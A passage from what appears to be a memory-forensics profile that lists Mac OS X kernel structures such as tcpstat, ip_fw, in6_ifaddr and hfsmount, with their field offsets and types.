    'fw_tcpf': [0x76, ['unsigned char']],
    'fw_tcpnf': [0x77, ['unsigned char']],
    'fw_icmp6types': [0x78, ['array', 8, ['unsigned int']]],
    'timestamp': [0x98, ['long']],
    'fw_in_if': [0xa0, ['ip6_fw_if']],
    'fw_out_if': [0xb4, ['ip6_fw_if']],
    'fw_un': [0xc8, ['__unnamed_9256478']],
    'fw_prot': [0xca, ['unsigned char']],
    'fw_nports': [0xcb, ['unsigned char']],
}],
  'nlist': [ 0xc, {
    'n_un': [0x0, ['__unnamed_13427050']],
    'n_type': [0x4, ['unsigned char']],
    'n_sect': [0x5, ['unsigned char']],
    'n_desc': [0x6, ['short']],
    'n_value': [0x8, ['unsigned int']],
}],
  'tcq_classstats': [ 0x2c0, {
    'class_handle': [0x0, ['unsigned int']],
    'priority': [0x4, ['unsigned int']],
    'qlength': [0x8, ['unsigned int']],
    'qlimit': [0xc, ['unsigned int']],
    'period': [0x10, ['unsigned int']],
    'xmitcnt': [0x18, ['pktcntr']],
    'dropcnt': [0x28, ['pktcntr']],
    'qtype': [0x38, ['Enumeration', {'target': 'int', 'choices': {0: 'Q_DROPHEAD', 1: 'Q_DROPTAIL', 2: 'Q_RED', 3: 'Q_RIO', 4: 'Q_BLUE', 5: 'Q_SFB'}}]],
    '__unnamed_7805806': [0x40, ['__unnamed_7805755']],
    'qstate': [0x2b8, ['Enumeration', {'target': 'int', 'choices': {0: 'QS_RUNNING', 1: 'QS_SUSPENDED'}}]],
}],
  'cpu_core': [ 0x48, {
    'cpuc_dtrace_illval': [0x0, ['unsigned long long']],
    'cpuc_pid_lock': [0x8, ['__unnamed_5564288']],
    'cpuc_dtrace_flags': [0x18, ['unsigned short']],
    'cpuc_missing_tos': [0x20, ['unsigned long long']],
    'cpuc_pad': [0x28, ['array', 30, ['unsigned char']]],
}],
  'in6_ifaddr': [ 0x150, {
    'ia_ifa': [0x0, ['ifaddr']],
    'ia_addr': [0x78, ['sockaddr_in6']],
    'ia_net': [0x94, ['sockaddr_in6']],
    'ia_dstaddr': [0xb0, ['sockaddr_in6']],
    'ia_prefixmask': [0xcc, ['sockaddr_in6']],
    'ia_plen': [0xe8, ['unsigned int']],
    'ia_next': [0xf0, ['pointer', ['in6_ifaddr']]],
    'ia6_flags': [0xf8, ['int']],
    'ia6_lifetime': [0x100, ['in6_addrlifetime_i']],
    'ia6_createtime': [0x128, ['unsigned long long']],
    'ia6_updatetime': [0x130, ['unsigned long long']],
    'ia6_ifpr': [0x138, ['pointer', ['ifprefix']]],
    'ia6_ndpr': [0x140, ['pointer', ['nd_prefix']]],
    'ia6_memberships': [0x148, ['__unnamed_9950390']],
}],
  '__unnamed_12508037': [ 0x10, {
    'le_next': [0x0, ['pointer', ['unpcb']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['unpcb']]]],
}],
  'sockaddr_ctl': [ 0x20, {
    'sc_len': [0x0, ['unsigned char']],
    'sc_family': [0x1, ['unsigned char']],
    'ss_sysaddr': [0x2, ['unsigned short']],
    'sc_id': [0x4, ['unsigned int']],
    'sc_unit': [0x8, ['unsigned int']],
    'sc_reserved': [0xc, ['array', 5, ['unsigned int']]],
}],
  'ifclassq_disc_slot': [ 0x10, {
    'qid': [0x0, ['unsigned int']],
    'cl': [0x8, ['pointer', ['void']]],
}],
  'pf_rule_xport': [ 0x8, {
    'spi': [0x0, ['unsigned int']],
    'range': [0x0, ['pf_port_range']],
    'call_id': [0x0, ['unsigned short']],
}],
  'global_stats': [ 0x1c, {
    'gs_pageout_calls': [0x0, ['unsigned int']],
    'gs_pagein_calls': [0x4, ['unsigned int']],
    'gs_pages_in': [0x8, ['unsigned int']],
    'gs_pages_out': [0xc, ['unsigned int']],
    'gs_pages_unavail': [0x10, ['unsigned int']],
    'gs_pages_init': [0x14, ['unsigned int']],
    'gs_pages_init_writes': [0x18, ['unsigned int']],
}],
  'tcpstat': [ 0x1f8, {
    'tcps_connattempt': [0x0, ['unsigned int']],
    'tcps_accepts': [0x4, ['unsigned int']],
    'tcps_connects': [0x8, ['unsigned int']],
    'tcps_drops': [0xc, ['unsigned int']],
    'tcps_conndrops': [0x10, ['unsigned int']],
    'tcps_closed': [0x14, ['unsigned int']],
    'tcps_segstimed': [0x18, ['unsigned int']],
    'tcps_rttupdated': [0x1c, ['unsigned int']],
    'tcps_delack': [0x20, ['unsigned int']],
    'tcps_timeoutdrop': [0x24, ['unsigned int']],
    'tcps_rexmttimeo': [0x28, ['unsigned int']],
    'tcps_persisttimeo': [0x2c, ['unsigned int']],
    'tcps_keeptimeo': [0x30, ['unsigned int']],
    'tcps_keepprobe': [0x34, ['unsigned int']],
    'tcps_keepdrops': [0x38, ['unsigned int']],
    'tcps_sndtotal': [0x3c, ['unsigned int']],
    'tcps_sndpack': [0x40, ['unsigned int']],
    'tcps_sndbyte': [0x44, ['unsigned int']],
    'tcps_sndrexmitpack': [0x48, ['unsigned int']],
    'tcps_sndrexmitbyte': [0x4c, ['unsigned int']],
    'tcps_sndacks': [0x50, ['unsigned int']],
    'tcps_sndprobe': [0x54, ['unsigned int']],
    'tcps_sndurg': [0x58, ['unsigned int']],
    'tcps_sndwinup': [0x5c, ['unsigned int']],
    'tcps_sndctrl': [0x60, ['unsigned int']],
    'tcps_rcvtotal': [0x64, ['unsigned int']],
    'tcps_rcvpack': [0x68, ['unsigned int']],
    'tcps_rcvbyte': [0x6c, ['unsigned int']],
    'tcps_rcvbadsum': [0x70, ['unsigned int']],
    'tcps_rcvbadoff': [0x74, ['unsigned int']],
    'tcps_rcvmemdrop': [0x78, ['unsigned int']],
    'tcps_rcvshort': [0x7c, ['unsigned int']],
    'tcps_rcvduppack': [0x80, ['unsigned int']],
    'tcps_rcvdupbyte': [0x84, ['unsigned int']],
    'tcps_rcvpartduppack': [0x88, ['unsigned int']],
    'tcps_rcvpartdupbyte': [0x8c, ['unsigned int']],
    'tcps_rcvoopack': [0x90, ['unsigned int']],
    'tcps_rcvoobyte': [0x94, ['unsigned int']],
    'tcps_rcvpackafterwin': [0x98, ['unsigned int']],
    'tcps_rcvbyteafterwin': [0x9c, ['unsigned int']],
    'tcps_rcvafterclose': [0xa0, ['unsigned int']],
    'tcps_rcvwinprobe': [0xa4, ['unsigned int']],
    'tcps_rcvdupack': [0xa8, ['unsigned int']],
    'tcps_rcvacktoomuch': [0xac, ['unsigned int']],
    'tcps_rcvackpack': [0xb0, ['unsigned int']],
    'tcps_rcvackbyte': [0xb4, ['unsigned int']],
    'tcps_rcvwinupd': [0xb8, ['unsigned int']],
    'tcps_pawsdrop': [0xbc, ['unsigned int']],
    'tcps_predack': [0xc0, ['unsigned int']],
    'tcps_preddat': [0xc4, ['unsigned int']],
    'tcps_pcbcachemiss': [0xc8, ['unsigned int']],
    'tcps_cachedrtt': [0xcc, ['unsigned int']],
    'tcps_cachedrttvar': [0xd0, ['unsigned int']],
    'tcps_cachedssthresh': [0xd4, ['unsigned int']],
    'tcps_usedrtt': [0xd8, ['unsigned int']],
    'tcps_usedrttvar': [0xdc, ['unsigned int']],
    'tcps_usedssthresh': [0xe0, ['unsigned int']],
    'tcps_persistdrop': [0xe4, ['unsigned int']],
    'tcps_badsyn': [0xe8, ['unsigned int']],
    'tcps_mturesent': [0xec, ['unsigned int']],
    'tcps_listendrop': [0xf0, ['unsigned int']],
    'tcps_minmssdrops': [0xf4, ['unsigned int']],
    'tcps_sndrexmitbad': [0xf8, ['unsigned int']],
    'tcps_badrst': [0xfc, ['unsigned int']],
    'tcps_sc_added': [0x100, ['unsigned int']],
    'tcps_sc_retransmitted': [0x104, ['unsigned int']],
    'tcps_sc_dupsyn': [0x108, ['unsigned int']],
    'tcps_sc_dropped': [0x10c, ['unsigned int']],
    'tcps_sc_completed': [0x110, ['unsigned int']],
    'tcps_sc_bucketoverflow': [0x114, ['unsigned int']],
    'tcps_sc_cacheoverflow': [0x118, ['unsigned int']],
    'tcps_sc_reset': [0x11c, ['unsigned int']],
    'tcps_sc_stale': [0x120, ['unsigned int']],
    'tcps_sc_aborted': [0x124, ['unsigned int']],
    'tcps_sc_badack': [0x128, ['unsigned int']],
    'tcps_sc_unreach': [0x12c, ['unsigned int']],
    'tcps_sc_zonefail': [0x130, ['unsigned int']],
    'tcps_sc_sendcookie': [0x134, ['unsigned int']],
    'tcps_sc_recvcookie': [0x138, ['unsigned int']],
    'tcps_hc_added': [0x13c, ['unsigned int']],
    'tcps_hc_bucketoverflow': [0x140, ['unsigned int']],
    'tcps_sack_recovery_episode': [0x144, ['unsigned int']],
    'tcps_sack_rexmits': [0x148, ['unsigned int']],
    'tcps_sack_rexmit_bytes': [0x14c, ['unsigned int']],
    'tcps_sack_rcv_blocks': [0x150, ['unsigned int']],
    'tcps_sack_send_blocks': [0x154, ['unsigned int']],
    'tcps_sack_sboverflow': [0x158, ['unsigned int']],
    'tcps_bg_rcvtotal': [0x15c, ['unsigned int']],
    'tcps_rxtfindrop': [0x160, ['unsigned int']],
    'tcps_fcholdpacket': [0x164, ['unsigned int']],
    'tcps_coalesced_pack': [0x168, ['unsigned int']],
    'tcps_flowtbl_full': [0x16c, ['unsigned int']],
    'tcps_flowtbl_collision': [0x170, ['unsigned int']],
    'tcps_lro_twopack': [0x174, ['unsigned int']],
    'tcps_lro_multpack': [0x178, ['unsigned int']],
    'tcps_lro_largepack': [0x17c, ['unsigned int']],
    'tcps_limited_txt': [0x180, ['unsigned int']],
    'tcps_early_rexmt': [0x184, ['unsigned int']],
    'tcps_sack_ackadv': [0x188, ['unsigned int']],
    'tcps_rcv_swcsum': [0x18c, ['unsigned int']],
    'tcps_rcv_swcsum_bytes': [0x190, ['unsigned int']],
    'tcps_rcv6_swcsum': [0x194, ['unsigned int']],
    'tcps_rcv6_swcsum_bytes': [0x198, ['unsigned int']],
    'tcps_snd_swcsum': [0x19c, ['unsigned int']],
    'tcps_snd_swcsum_bytes': [0x1a0, ['unsigned int']],
    'tcps_snd6_swcsum': [0x1a4, ['unsigned int']],
    'tcps_snd6_swcsum_bytes': [0x1a8, ['unsigned int']],
    'tcps_msg_unopkts': [0x1ac, ['unsigned int']],
    'tcps_msg_unoappendfail': [0x1b0, ['unsigned int']],
    'tcps_msg_sndwaithipri': [0x1b4, ['unsigned int']],
    'tcps_invalid_mpcap': [0x1b8, ['unsigned int']],
    'tcps_invalid_joins': [0x1bc, ['unsigned int']],
    'tcps_mpcap_fallback': [0x1c0, ['unsigned int']],
    'tcps_join_fallback': [0x1c4, ['unsigned int']],
    'tcps_estab_fallback': [0x1c8, ['unsigned int']],
    'tcps_invalid_opt': [0x1cc, ['unsigned int']],
    'tcps_mp_outofwin': [0x1d0, ['unsigned int']],
    'tcps_mp_reducedwin': [0x1d4, ['unsigned int']],
    'tcps_mp_badcsum': [0x1d8, ['unsigned int']],
    'tcps_mp_oodata': [0x1dc, ['unsigned int']],
    'tcps_mp_switches': [0x1e0, ['unsigned int']],
    'tcps_mp_rcvtotal': [0x1e4, ['unsigned int']],
    'tcps_mp_rcvbytes': [0x1e8, ['unsigned int']],
    'tcps_mp_sndpacks': [0x1ec, ['unsigned int']],
    'tcps_mp_sndbytes': [0x1f0, ['unsigned int']],
    'tcps_join_rxmts': [0x1f4, ['unsigned int']],
}],
  'nd_opts': [ 0x50, {
    'nd_opt_array': [0x0, ['array', 8, ['pointer', ['nd_opt_hdr']]]],
    'nd_opt_each': [0x0, ['__unnamed_9767220']],
}],
  'user32_msghdr': [ 0x1c, {
    'msg_name': [0x0, ['unsigned int']],
    'msg_namelen': [0x4, ['unsigned int']],
    'msg_iov': [0x8, ['unsigned int']],
    'msg_iovlen': [0xc, ['int']],
    'msg_control': [0x10, ['unsigned int']],
    'msg_controllen': [0x14, ['unsigned int']],
    'msg_flags': [0x18, ['int']],
}],
  '__unnamed_16778828': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['mount']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['mount']]]],
}],
  'IONotifier_class': [ 0x10, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
}],
  '_le_peak': [ 0x8, {
    'le_max': [0x0, ['unsigned int']],
    'le_time': [0x4, ['unsigned int']],
}],
  'log2phys': [ 0x14, {
    'l2p_flags': [0x0, ['unsigned int']],
    'l2p_contigbytes': [0x4, ['long long']],
    'l2p_devoffset': [0xc, ['long long']],
}],
  '__unnamed_12888356': [ 0x70, {
    'MH_ext': [0x0, ['m_ext']],
    'MH_databuf': [0x0, ['array', 112, ['char']]],
}],
  '__unnamed_17061628': [ 0x10, {
    'le_next': [0x0, ['pointer', ['fileglob']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['fileglob']]]],
}],
  'ip_fw_compat': [ 0xb0, {
    'version': [0x0, ['unsigned int']],
    'context': [0x8, ['pointer', ['void']]],
    'fw_pcnt': [0x10, ['unsigned long long']],
    'fw_bcnt': [0x18, ['unsigned long long']],
    'fw_src': [0x20, ['in_addr']],
    'fw_dst': [0x24, ['in_addr']],
    'fw_smsk': [0x28, ['in_addr']],
    'fw_dmsk': [0x2c, ['in_addr']],
    'fw_number': [0x30, ['unsigned short']],
    'fw_flg': [0x34, ['unsigned int']],
    'fw_uar_compat': [0x38, ['__unnamed_8266467']],
    'fw_ipflg': [0x4c, ['unsigned int']],
    'fw_ipopt': [0x50, ['unsigned char']],
    'fw_ipnopt': [0x51, ['unsigned char']],
    'fw_tcpopt': [0x52, ['unsigned char']],
    'fw_tcpnopt': [0x53, ['unsigned char']],
    'fw_tcpf': [0x54, ['unsigned char']],
    'fw_tcpnf': [0x55, ['unsigned char']],
    'timestamp': [0x58, ['long']],
    'fw_in_if': [0x60, ['ip_fw_if_compat']],
    'fw_out_if': [0x6c, ['ip_fw_if_compat']],
    'fw_un_compat': [0x78, ['__unnamed_8266667']],
    'fw_prot': [0x88, ['unsigned char']],
    'fw_nports': [0x89, ['unsigned char']],
    'pipe_ptr': [0x90, ['pointer', ['void']]],
    'next_rule_ptr': [0x98, ['pointer', ['void']]],
    'fw_uid': [0xa0, ['unsigned int']],
    'fw_logamount': [0xa4, ['int']],
    'fw_loghighest': [0xa8, ['unsigned long long']],
}],
  '__unnamed_8693450': [ 0x1c, {
    '_itpl_sin': [0x0, ['sockaddr_in']],
    '_itpl_sin6': [0x0, ['sockaddr_in6']],
    '_itpl_sa': [0x0, ['sockaddr']],
}],
  '__unnamed_7034859': [ 0x1c, {
    'v4': [0x0, ['sockaddr_in']],
    'v6': [0x0, ['sockaddr_in6']],
}],
  'vm_map_links': [ 0x20, {
    'prev': [0x0, ['pointer', ['vm_map_entry']]],
    'next': [0x8, ['pointer', ['vm_map_entry']]],
    'start': [0x10, ['unsigned long long']],
    'end': [0x18, ['unsigned long long']],
}],
  'if_llreach_info': [ 0x78, {
    'lri_refcnt': [0x0, ['unsigned int']],
    'lri_ifindex': [0x4, ['unsigned int']],
    'lri_expire': [0x8, ['unsigned long long']],
    'lri_probes': [0x10, ['unsigned int']],
    'lri_reserved': [0x14, ['unsigned short']],
    'lri_proto': [0x16, ['unsigned short']],
    'lri_addr': [0x18, ['array', 64, ['unsigned char']]],
    'lri_rssi': [0x58, ['int']],
    'lri_lqm': [0x5c, ['int']],
    'lri_npm': [0x60, ['int']],
    'lri_reserved2': [0x64, ['array', 16, ['unsigned char']]],
}],
  'select_nocancel_args': [ 0x28, {
    'nd_l_': [0x0, ['array', 0, ['char']]],
    'nd': [0x0, ['int']],
    'nd_r_': [0x4, ['array', 4, ['char']]],
    'in': [0x8, ['unsigned long long']],
    'in_l_': [0x8, ['array', 0, ['char']]],
    'ou_l_': [0x10, ['array', 0, ['char']]],
    'in_r_': [0x10, ['array', 0, ['char']]],
    'ou': [0x10, ['unsigned long long']],
    'ex': [0x18, ['unsigned long long']],
    'ex_l_': [0x18, ['array', 0, ['char']]],
    'ou_r_': [0x18, ['array', 0, ['char']]],
    'tv': [0x20, ['unsigned long long']],
    'tv_l_': [0x20, ['array', 0, ['char']]],
    'ex_r_': [0x20, ['array', 0, ['char']]],
    'tv_r_': [0x28, ['array', 0, ['char']]],
}],
  '__siginfo': [ 0x68, {
    'si_signo': [0x0, ['int']],
    'si_errno': [0x4, ['int']],
    'si_code': [0x8, ['int']],
    'si_pid': [0xc, ['int']],
    'si_uid': [0x10, ['unsigned int']],
    'si_status': [0x14, ['int']],
    'si_addr': [0x18, ['pointer', ['void']]],
    'si_value': [0x20, ['sigval']],
    'si_band': [0x28, ['long']],
    '__pad': [0x30, ['array', 7, ['unsigned long']]],
}],
  'UNDDisplayAlertSimple_rpcMessU': [ 0x7f0, {
    'Out': [0x0, ['__unnamed_143536']],
    'In': [0x0, ['__unnamed_143048']],
}],
  'msync_args': [ 0x18, {
    'addr': [0x0, ['unsigned long long']],
    'addr_l_': [0x0, ['array', 0, ['char']]],
    'addr_r_': [0x8, ['array', 0, ['char']]],
    'len': [0x8, ['unsigned long long']],
    'len_l_': [0x8, ['array', 0, ['char']]],
    'flags_l_': [0x10, ['array', 0, ['char']]],
    'flags': [0x10, ['int']],
    'len_r_': [0x10, ['array', 0, ['char']]],
    'flags_r_': [0x14, ['array', 4, ['char']]],
}],
  'dtrace_module_symbols': [ 0xa8, {
    'dtmodsyms_uuid': [0x0, ['array', 16, ['unsigned char']]],
    'dtmodsyms_count': [0x10, ['unsigned long long']],
    'dtmodsyms_symbols': [0x18, ['array', 1, ['dtrace_symbol']]],
}],
  'in6_multi_dbg': [ 0x12f0, {
    'in6m': [0x0, ['in6_multi']],
    'in6m_refhold_cnt': [0xd8, ['unsigned short']],
    'in6m_refrele_cnt': [0xda, ['unsigned short']],
    'in6m_refhold': [0xe0, ['array', 32, ['ctrace']]],
    'in6m_refrele': [0x9e0, ['array', 32, ['ctrace']]],
    'in6m_trash_link': [0x12e0, ['__unnamed_9496870']],
}],
  '__unnamed_9679129': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'ip6_fw_chain': [ 0x18, {
    'chain': [0x0, ['__unnamed_9256590']],
    'rule': [0x10, ['pointer', ['ip6_fw']]],
}],
  'pf_grev1_state': [ 0x8, {
    'pptp_state': [0x0, ['pointer', ['pf_state']]],
}],
  'prproxy_sols_tree': [ 0x8, {
    'rbh_root': [0x0, ['pointer', ['nd6_prproxy_soltgt']]],
}],
  'apple_protect_pager': [ 0x58, {
    'pager_header': [0x0, ['ipc_object_header']],
    'pager_ops': [0x8, ['pointer', ['memory_object_pager_ops']]],
    'pager_queue': [0x10, ['queue_entry']],
    'ref_count': [0x20, ['unsigned int']],
    'is_ready': [0x24, ['int']],
    'is_mapped': [0x28, ['int']],
    'pager_control': [0x30, ['pointer', ['memory_object_control']]],
    'backing_object': [0x38, ['pointer', ['vm_object']]],
    'crypt': [0x40, ['pager_crypt_info']],
}],
  'dlil_threading_info': [ 0x190, {
    'input_lck': [0x0, ['__unnamed_12877919']],
    'lck_grp': [0x10, ['pointer', ['__lck_grp__']]],
    'input_waiting': [0x18, ['unsigned int']],
    'wtot': [0x1c, ['unsigned int']],
    'input_name': [0x20, ['array', 32, ['char']]],
    'ifp': [0x40, ['pointer', ['ifnet']]],
    'rcvq_pkts': [0x48, ['_class_queue_']],
    'stats': [0x70, ['ifnet_stat_increment_param']],
    'net_affinity': [0x90, ['int']],
    'input_thr': [0x98, ['pointer', ['thread']]],
    'wloop_thr': [0xa0, ['pointer', ['thread']]],
    'poll_thr': [0xa8, ['pointer', ['thread']]],
    'tag': [0xb0, ['unsigned int']],
    'mode': [0xb4, ['unsigned int']],
    'tstats': [0xb8, ['pktcntr']],
    'pstats': [0xc8, ['if_rxpoll_stats']],
    'sstats': [0x128, ['pktcntr']],
    'mode_holdtime': [0x138, ['timespec']],
    'mode_lasttime': [0x148, ['timespec']],
    'sample_holdtime': [0x158, ['timespec']],
    'sample_lasttime': [0x168, ['timespec']],
    'dbg_lasttime': [0x178, ['timespec']],
    'input_mbuf_cnt': [0x188, ['unsigned long long']],
}],
  'service_curve': [ 0x20, {
    'fl': [0x0, ['unsigned int']],
    'm1': [0x8, ['unsigned long long']],
    'd': [0x10, ['unsigned int']],
    'm2': [0x18, ['unsigned long long']],
}],
  '__unnamed_6594556': [ 0x8, {
    'sle_next': [0x0, ['pointer', ['if_proto']]],
}],
  '__unnamed_4591112': [ 0x4, {
    'cpu_tlb_invalid_local': [0x0, ['unsigned short']],
    'cpu_tlb_invalid_global': [0x2, ['unsigned short']],
}],
  'fmsglist': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['fileglob']]],
}],
  '__unnamed_12211915': [ 0x100, {
    'xu_dummy1': [0x0, ['array', 256, ['char']]],
    'xuu_addr': [0x0, ['sockaddr_un']],
}],
  '__unnamed_12512053': [ 0x10, {
    'inp6_foreign': [0x0, ['in6_addr']],
    'inp46_foreign': [0x0, ['in_addr_4in6']],
}],
  'issetugid_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'sembuf': [ 0x6, {
    'sem_num': [0x0, ['unsigned short']],
    'sem_op': [0x2, ['short']],
    'sem_flg': [0x4, ['short']],
}],
  'ip_fw': [ 0x58, {
    'version': [0x0, ['unsigned int']],
    'context': [0x8, ['pointer', ['void']]],
    'next': [0x10, ['pointer', ['ip_fw']]],
    'next_rule': [0x18, ['pointer', ['ip_fw']]],
    'act_ofs': [0x20, ['unsigned short']],
    'cmd_len': [0x22, ['unsigned short']],
    'rulenum': [0x24, ['unsigned short']],
    'set': [0x26, ['unsigned char']],
    'set_masks': [0x28, ['array', 2, ['unsigned int']]],
    '_pad': [0x30, ['unsigned char']],
    'pcnt': [0x38, ['unsigned long long']],
    'bcnt': [0x40, ['unsigned long long']],
    'timestamp': [0x48, ['unsigned int']],
    'reserved_1': [0x4c, ['unsigned int']],
    'reserved_2': [0x50, ['unsigned int']],
    'cmd': [0x54, ['array', 1, ['_ipfw_insn']]],
}],
  '__unnamed_6520369': [ 0x10, {
    'le_next': [0x0, ['pointer', ['bridge_rtnode']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['bridge_rtnode']]]],
}],
  'getfh_args': [ 0x10, {
    'fname_l_': [0x0, ['array', 0, ['char']]],
    'fname': [0x0, ['unsigned long long']],
    'fhp_l_': [0x8, ['array', 0, ['char']]],
    'fname_r_': [0x8, ['array', 0, ['char']]],
    'fhp': [0x8, ['unsigned long long']],
    'fhp_r_': [0x10, ['array', 0, ['char']]],
}],
  '_lck_mtx_': [ 0x10, {
    'lck_mtx_sw': [0x0, ['__unnamed_4600042']],
}],
  '__unnamed_4941356': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfs_lock_msg_request']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfs_lock_msg_request']]]],
}],
  'trim_list': [ 0x18, {
    'tl_offset': [0x0, ['unsigned long long']],
    'tl_length': [0x8, ['unsigned long long']],
    'tl_next': [0x10, ['pointer', ['trim_list']]],
}],
  '__unnamed_8693520': [ 0x1c, {
    '_itpl_sin': [0x0, ['sockaddr_in']],
    '_itpl_sin6': [0x0, ['sockaddr_in6']],
    '_itpl_sa': [0x0, ['sockaddr']],
}],
  '__unnamed_10548639': [ 0x8, {
    'cfu_clump': [0x0, ['unsigned int']],
    'cfu_bytesread': [0x0, ['unsigned long long']],
}],
  'dtrace_aggbuffer': [ 0x18, {
    'dtagb_hashsize': [0x0, ['unsigned long']],
    'dtagb_free': [0x8, ['unsigned long']],
    'dtagb_hash': [0x10, ['pointer', ['pointer', ['dtrace_aggkey']]]],
}],
  'rl_head': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['rl_entry']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['rl_entry']]]],
}],
  'kill_args': [ 0x18, {
    'pid_l_': [0x0, ['array', 0, ['char']]],
    'pid': [0x0, ['int']],
    'pid_r_': [0x4, ['array', 4, ['char']]],
    'signum_l_': [0x8, ['array', 0, ['char']]],
    'signum': [0x8, ['int']],
    'signum_r_': [0xc, ['array', 4, ['char']]],
    'posix_l_': [0x10, ['array', 0, ['char']]],
    'posix': [0x10, ['int']],
    'posix_r_': [0x14, ['array', 4, ['char']]],
}],
  'bsm_errno': [ 0x8, {
    'be_bsm_errno': [0x0, ['int']],
    'be_local_errno': [0x4, ['int']],
}],
  'proc_workqueueinfo': [ 0x10, {
    'pwq_nthreads': [0x0, ['unsigned int']],
    'pwq_runthreads': [0x4, ['unsigned int']],
    'pwq_blockedthreads': [0x8, ['unsigned int']],
    'pwq_state': [0xc, ['unsigned int']],
}],
  'vnop_reclaim_args': [ 0x18, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_vp': [0x8, ['pointer', ['vnode']]],
    'a_context': [0x10, ['pointer', ['vfs_context']]],
}],
  'locklist': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['lockf']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['lockf']]]],
}],
  'shmget_args': [ 0x18, {
    'key': [0x0, ['int']],
    'key_l_': [0x0, ['array', 0, ['char']]],
    'key_r_': [0x4, ['array', 4, ['char']]],
    'size_l_': [0x8, ['array', 0, ['char']]],
    'size': [0x8, ['unsigned long long']],
    'shmflg': [0x10, ['int']],
    'size_r_': [0x10, ['array', 0, ['char']]],
    'shmflg_l_': [0x10, ['array', 0, ['char']]],
    'shmflg_r_': [0x14, ['array', 4, ['char']]],
}],
  'pf_src_tree': [ 0x8, {
    'rbh_root': [0x0, ['pointer', ['pf_src_node']]],
}],
  'pf_port_range': [ 0x6, {
    'port': [0x0, ['array', 2, ['unsigned short']]],
    'op': [0x4, ['unsigned char']],
}],
  'IOWatchDogTimer_class': [ 0x98, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'notifier': [0x88, ['pointer', ['IONotifier_class']]],
    'reserved': [0x90, ['pointer', ['ExpansionData']]],
}],
  'sendmsg_args': [ 0x18, {
    's_l_': [0x0, ['array', 0, ['char']]],
    's': [0x0, ['int']],
    's_r_': [0x4, ['array', 4, ['char']]],
    'msg_l_': [0x8, ['array', 0, ['char']]],
    'msg': [0x8, ['unsigned long long']],
    'flags_l_': [0x10, ['array', 0, ['char']]],
    'msg_r_': [0x10, ['array', 0, ['char']]],
    'flags': [0x10, ['int']],
    'flags_r_': [0x14, ['array', 4, ['char']]],
}],
  'paging_segment': [ 0x68, {
    'storage_type': [0x0, ['__unnamed_68107']],
    'ps_segtype': [0x8, ['unsigned int']],
    'ps_device': [0x10, ['pointer', ['ipc_port']]],
    'ps_offset': [0x18, ['unsigned int']],
    'ps_recnum': [0x1c, ['unsigned int']],
    'ps_pgnum': [0x20, ['unsigned int']],
    'ps_record_shift': [0x24, ['unsigned int']],
    'ps_clshift': [0x28, ['unsigned int']],
    'ps_ncls': [0x2c, ['unsigned int']],
    'ps_clcount': [0x30, ['unsigned int']],
    'ps_pgcount': [0x34, ['unsigned int']],
    'ps_hint': [0x38, ['unsigned int']],
    'ps_special_clusters': [0x3c, ['unsigned int']],
    'ps_lock': [0x40, ['_lck_mtx_']],
    'ps_bmap': [0x50, ['pointer', ['unsigned char']]],
    'ps_bs': [0x58, ['pointer', ['backing_store']]],
    'ps_state': [0x60, ['unsigned int']],
}],
  'ip': [ 0x14, {
    'ip_vhl': [0x0, ['unsigned char']],
    'ip_tos': [0x1, ['unsigned char']],
    'ip_len': [0x2, ['unsigned short']],
    'ip_id': [0x4, ['unsigned short']],
    'ip_off': [0x6, ['unsigned short']],
    'ip_ttl': [0x8, ['unsigned char']],
    'ip_p': [0x9, ['unsigned char']],
    'ip_sum': [0xa, ['unsigned short']],
    'ip_src': [0xc, ['in_addr']],
    'ip_dst': [0x10, ['in_addr']],
}],
  'sockaddr_in': [ 0x10, {
    'sin_len': [0x0, ['unsigned char']],
    'sin_family': [0x1, ['unsigned char']],
    'sin_port': [0x2, ['unsigned short']],
    'sin_addr': [0x4, ['in_addr']],
    'sin_zero': [0x8, ['array', 8, ['char']]],
}],
  'nfssvc_args': [ 0x10, {
    'flag_l_': [0x0, ['array', 0, ['char']]],
    'flag': [0x0, ['int']],
    'flag_r_': [0x4, ['array', 4, ['char']]],
    'argp': [0x8, ['unsigned long long']],
    'argp_l_': [0x8, ['array', 0, ['char']]],
    'argp_r_': [0x10, ['array', 0, ['char']]],
}],
  'setlcid_args': [ 0x10, {
    'pid': [0x0, ['int']],
    'pid_l_': [0x0, ['array', 0, ['char']]],
    'pid_r_': [0x4, ['array', 4, ['char']]],
    'lcid': [0x8, ['int']],
    'lcid_l_': [0x8, ['array', 0, ['char']]],
    'lcid_r_': [0xc, ['array', 4, ['char']]],
}],
  'hfsmount': [ 0x648, {
    'hfs_flags': [0x0, ['unsigned int']],
    'hfs_logical_block_size': [0x4, ['unsigned int']],
    'hfs_logical_block_count': [0x8, ['long long']],
    'hfs_logical_bytes': [0x10, ['unsigned long long']],
    'hfs_alt_id_sector': [0x18, ['long long']],
    'hfs_physical_block_size': [0x20, ['unsigned int']],
    'hfs_log_per_phys': [0x24, ['unsigned int']],
    'hfs_mp': [0x28, ['pointer', ['mount']]],
    'hfs_devvp': [0x30, ['pointer', ['vnode']]],
    'hfs_extents_vp': [0x38, ['pointer', ['vnode']]],
    'hfs_catalog_vp': [0x40, ['pointer', ['vnode']]],
    'hfs_allocation_vp': [0x48, ['pointer', ['vnode']]],
    'hfs_attribute_vp': [0x50, ['pointer', ['vnode']]],
    'hfs_startup_vp': [0x58, ['pointer', ['vnode']]],
    'hfs_attrdata_vp': [0x60, ['pointer', ['vnode']]],
